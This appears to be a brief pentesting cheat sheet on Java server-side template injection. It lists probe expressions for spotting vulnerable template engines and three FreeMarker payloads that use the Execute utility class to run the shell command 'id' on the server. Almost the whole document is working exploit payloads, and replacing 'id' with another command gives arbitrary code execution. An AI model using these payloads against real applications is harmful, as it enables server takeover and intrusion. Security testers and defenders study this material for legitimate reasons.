#SSTI #java

## Detection
```
{{7*7}}
```
→ {{7*7}}

```
${7*7}
```
→ 49

```
#{7*7}
```
→ 49 (legacy)

```
${7*'7'}
```
→ Nothing

```
${foobar}
```
 → Print var if it exists

## RCE 
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
```

```
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
```

```
${"freemarker.template.utility.Execute"?new()("id")}
```